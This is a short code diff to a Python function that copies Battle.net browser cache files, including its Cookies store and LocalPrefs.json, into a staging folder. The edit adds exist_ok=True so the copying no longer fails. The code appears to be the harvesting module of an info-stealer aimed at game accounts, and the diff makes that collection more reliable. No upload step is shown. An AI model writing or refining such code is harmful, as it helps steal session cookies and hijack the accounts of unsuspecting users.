@@ -19,7 +19,7 @@ def BattleNet():
             r'\Battle.net\BrowserCaches\LocalPrefs.json',
             r'\Battle.net\BrowserCaches\common\Cookies'
         ]
-        makedirs(f"{pathtofile}\\Games\\Battle.net")
+        makedirs(f"{pathtofile}\\Games\\Battle.net", exist_ok=True)
         for folder in folders:
             try:
                 copytree(f"{local}{folder}",f"{pathtofile}\\Games{folder}")
